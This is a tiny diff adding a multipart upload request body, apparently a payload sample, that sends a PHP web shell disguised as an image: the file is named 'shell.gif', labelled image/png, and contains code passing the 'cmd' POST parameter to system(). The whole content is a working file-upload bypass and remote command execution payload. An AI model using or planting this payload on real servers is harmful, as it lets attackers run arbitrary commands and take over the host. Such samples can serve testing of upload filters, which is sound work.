@@ -1,0 +1,7 @@
+------------0x15f0e7eb752
+Content-Disposition: form-data; name="file"; filename="shell.gif"
+Content-Type: image/png
+ 
+<script language=php> echo $_POST['cmd']; system($_POST['cmd']);</script>
+
+------------0x15f0e7eb752--
